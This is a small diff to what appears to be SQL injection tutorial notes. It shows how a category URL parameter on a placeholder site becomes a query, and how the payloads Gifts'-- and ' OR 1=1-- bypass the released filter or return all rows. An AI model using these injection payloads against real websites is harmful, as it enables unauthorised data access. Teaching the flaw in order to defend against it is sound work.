@@ -3,9 +3,11 @@
 [https://insecure-website.com/products?category=Gifts]
 
 `SELECT * FROM products WHERE category = 'Gifts' AND released = 1` 
+
 [https://insecure-website.com/products?category=Gifts%27--]
 
 `SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1` 
+
 [https://insecure-website.com/products?category=Gifts%27+OR+1=1--]
 
 `SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1` 
